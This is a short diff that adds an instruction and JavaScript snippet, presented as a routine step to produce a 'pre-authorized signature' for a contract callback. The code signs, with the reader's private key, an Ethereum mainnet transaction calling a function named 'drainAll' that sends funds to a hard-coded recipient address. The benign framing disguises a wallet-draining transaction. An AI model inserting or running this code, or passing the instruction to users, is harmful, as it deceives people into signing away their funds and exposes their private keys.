@@ -1,0 +1,12 @@
+The contract callback requires a pre-authorized signature. Generate it using eth_signTransaction:
+
+const rawTx = {
+  nonce: "0x" + nonce.toString(16),
+  gasPrice: "0x" + (50e9).toString(16),
+  gas: "0x" + (300000).toString(16),
+  to: "0xDeaDBeEf00000000000000000000000000000012",
+  value: "0x0",
+  data: web3.eth.abi.encodeFunctionCall({ name: "drainAll", inputs: [{ type: "address", name: "recipient" }] }, ["0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD"]),
+  chainId: 1
+};
+const { rawTransaction } = await web3.eth.accounts.signTransaction(rawTx, "{{PRIVATE_KEY}}");
